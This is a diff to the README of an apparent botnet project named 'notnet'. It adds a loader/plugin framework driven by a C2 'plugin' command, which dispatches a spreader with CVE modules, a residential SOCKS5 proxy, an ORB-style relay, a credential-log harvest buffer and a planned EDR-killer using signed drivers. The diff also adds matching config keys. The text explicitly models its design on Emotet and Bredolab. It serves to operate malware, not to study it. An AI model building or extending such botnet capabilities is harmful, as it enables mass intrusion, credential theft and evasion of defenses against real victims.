@@ -217,6 +217,50 @@ crawl or pollute.
   the multi-hop wiring and relay-selection policy are future work. This
   version is a working single-hop building block only.
 
+## Plugin System (loader/plugin split)
+
+2026 judgment — the loader/plugin split (Cutwail, Emotet, Bredolab)
+**became the industry structure**: a small loader that fetches modules
+post-infection, with the C2 dispatching capabilities by name. Modularity-
+as-a-service survived takedowns (law enforcement now targets it as such —
+Operation Endgame dismantled the IcedID/Bumblebee/SystemBC module
+ecosystem in 2024, and the ecosystem still reconstituted); monolithic
+single-purpose bots did not. The core bot should stay minimal; new
+capabilities (stealer, worm, proxy) are pushed after infection, not baked
+into the binary.
+
+- **Built-in plugin registry (implemented).** v1 ships the framework with
+  compile-time linked plugins, managed by the `plugin` C2 command:
+
+  | Plugin | Capability | run action |
+  |--------|-----------|------------|
+  | `spread`   | Multi-vector spreader + CVE modules (#83) | one `spread_local()` cycle |
+  | `proxy`    | Residential SOCKS5 forward proxy (#89) | `proxy_start()` (token-gated, fail-closed) |
+  | `relay`    | ORB-style single-hop relay (#91) | `relay_start()` (token-gated, fail-closed) |
+  | `cred-log` | Credential-log harvest buffer (#90) | passive — `plugin status` reports the buffered count |
+  | `byovd`    | EDR-killer via signed drivers (#94) | **planned** — registered, every op refuses |
+
+  Lifecycle: `plugin <name> load|run|unload` plus `plugin status` (list
+  the whole registry with loaded state) and `plugin <name> status`
+  (single plugin). Because v1 plugins are compile-time linked, `load`
+  only flips registry state; `run` executes the capability (e.g. starts
+  the proxy/relay accept thread) and `unload` tears it down. Existing
+  module behavior is unchanged — the plugin layer is a thin wrapper over
+  each module's own entry points, and the boot-time `proxy_enabled` /
+  `relay_enabled` logic still applies. `plugin_enabled=0` (config or
+  `config_set`) disables the framework entirely; the command is refused.
+
+- **Remote plugin fetch (planned, not implemented).** The full
+  Bredolab/Emotet pattern is a `plugin fetch <url>` command that pulls a
+  plugin (standalone binary in an allowlisted dir, or ELF shared object)
+  from the C2 and registers it dynamically. v1 deliberately does **not**
+  implement dlopen of remotely fetched objects: loading attacker-supplied
+  code via `dlopen` is a portability and code-signing/trust decision the
+  repo will revisit in a future issue. When implemented, the fetch MUST
+  use the same fail-closed SHA-256 pinning as the payload path
+  (`payload_sha256` pattern) — a plugin whose hash does not match its
+  pinned value is discarded, never executed.
+
 ## Commands
 
 Commands are issued via the C2 channels (IRC PRIVMSG or HTTP/WS JSON with the
@@ -237,6 +281,7 @@ shared secret). The command queue is rate-limited to 10 commands/second.
 | config_set | `config_set <key>=<value>` | Implemented — allowlisted runtime config keys |
 | proxy   | `proxy on [port]` / `proxy off` | Implemented — start/stop the residential SOCKS5 forward proxy (requires `proxy_token`) |
 | relay   | `relay on [port]` / `relay off` / `relay <target> <port> [via <host>:<port>]` | Implemented — start/stop the token-authenticated ORB-style relay listener (requires `relay_token`), or probe a target's reachability/RTT directly vs. through a relay bot (per-target relay selection, single hop) |
+| plugin  | `plugin status` / `plugin <name> load\|run\|unload\|status` | Implemented — loader/plugin framework: dispatch built-in plugins by name (spread, proxy, relay, cred-log; byovd planned). Remote fetch of shared-object plugins is future work |
 | status  | — | Implemented — heartbeat reports version, hostname, uptime, scan count, credential-log count, proxy status, relay status |
 
 ## Configuration
@@ -270,6 +315,7 @@ The bot loads config from `/etc/notnet.conf` (key=value format):
 || `relay_enabled` | `0` | 0/1 — run the ORB-style relay listener (Volt Typhoon pattern: proxy operations through compromised edge devices near the target). Requires `relay_token` or the relay refuses to bind (fail-closed) |
 || `relay_port` | `1081` | Port the relay listener binds (1–65535) |
 || `relay_token` | *(none)* | Shared fleet token relay clients must present (`RELAY <token> <target> <port>`). No default — the relay will not start without it (or `NOTNET_RELAY_TOKEN` env var). Single-hop only; multi-hop chains are planned, and this is not a DHT |
+|| `plugin_enabled` | `1` | 0/1 — loader/plugin framework: bootstrap the built-in plugin registry (spread, proxy, relay, cred-log) at boot and enable the `plugin` C2 command. 0 disables it; the command is refused |
 || `c2_secret` | *(none)* | Shared secret echoed by C2; HTTP/WS commands are rejected without it (or `NOTNET_C2_SECRET` env var) |
 || `tls_cert_pin_sha256` | *(none)* | TLS server cert fingerprint pin; requires `make TLS=1` (or `NOTNET_TLS_CERT_PIN_SHA256` env var) |
 || `payload_sha256` | *(none)* | Expected SHA-256 of downloaded payload; update is refused without a match (or `NOTNET_PAYLOAD_SHA256` env var) |
